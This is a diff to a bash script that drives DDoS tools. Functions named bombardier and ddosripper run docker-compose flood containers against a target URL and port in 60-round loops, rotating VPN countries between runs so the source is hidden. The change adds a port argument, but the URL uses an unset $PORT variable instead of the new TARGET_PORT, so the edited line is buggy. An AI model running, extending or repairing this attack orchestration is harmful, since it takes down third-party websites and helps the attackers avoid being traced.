@@ -2,9 +2,10 @@
 
 bombardier()
 {
-    export VPN_CODE=$2
-    export VPN_COUNTRY=$3
-    export B_TARGET_URL="https://$1"
+    export VPN_CODE=$3
+    export VPN_COUNTRY=$4
+    export TARGET_PORT=$2
+    export B_TARGET_URL="https://$1:$PORT"
     for i in {1..60}
     do
         echo "Running bombardier $i time. $VPN_CODE $VPN_COUNTRY $B_TARGET_URL"
@@ -16,6 +17,7 @@ bombardier()
         echo "Executing bombardier..."
         sleep 10s
         id=$(sudo docker-compose ps -q bombardier)
+        echo "Logs:"
         sudo docker logs --since 10s $id
         sleep 120s
         sudo -E docker-compose down
@@ -24,8 +26,9 @@ bombardier()
 
 ddosripper()
 {
-    export VPN_CODE=$2
-    export VPN_COUNTRY=$3
+    export VPN_CODE=$3
+    export VPN_COUNTRY=$4
+    export TARGET_PORT=$2
     export R_TARGET_URL=$1
     for i in {1..60}
     do
@@ -63,9 +66,10 @@ checksites(){
     done
 }
 all(){
-    export VPN_CODE=$2
-    export VPN_COUNTRY=$3
-    export B_TARGET_URL="https://$1"
+    export VPN_CODE=$3
+    export VPN_COUNTRY=$4
+    export TARGET_PORT=$2
+    export B_TARGET_URL="https://$1:$PORT"
     export R_TARGET_URL=$1
     echo "Running all $i time. $VPN_CODE $VPN_COUNTRY"
     sudo -E docker-compose down
